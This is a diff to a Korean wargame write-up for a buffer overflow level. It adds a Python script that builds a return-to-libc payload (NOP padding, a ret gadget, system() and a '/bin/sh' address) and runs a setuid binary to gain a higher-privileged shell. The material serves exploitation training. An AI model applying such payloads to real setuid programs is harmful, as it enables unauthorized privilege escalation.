@@ -123,7 +123,7 @@ ret 주소에 라이브러리 주소나, 스택의 주소를 넣을 수 없으�
 
 따라서 더블 ret 가 실행되고, system함수를 불러오고 인자에 ""/bin/sh"를 넣어주어 쉘을 획득하였다.
 
-
+ret = 0x0804851e
 
 system = 0x40058ae0
 
@@ -142,6 +142,40 @@ pushing me away
 bash$ id
 uid=514(giant) gid=514(giant) euid=515(assassin) egid=515(assassin) groups=514(giant)
 ```
+
+
+
+-----
+
+
+
+```python
+import os
+import struct
+
+p32 = lambda x: struct.pack("<I", x)
+append = lambda x: payload + x
+
+target = "/home/giant/assassin"
+
+ret = 0x0804851e
+system = 0x40058ae0
+bin_sh = 0x400fbff9
+
+payload = "\x90"*44
+payload = append(p32(ret))
+payload = append(p32(system))
+payload = append("\x90"*4)
+payload = append(p32(bin_sh))
+
+pid = os.fork()
+if pid == 0:
+        os.execv(target, (target, payload))
+else:
+        os.waitpid(pid, 0)
+```
+
+
 
 -----
 
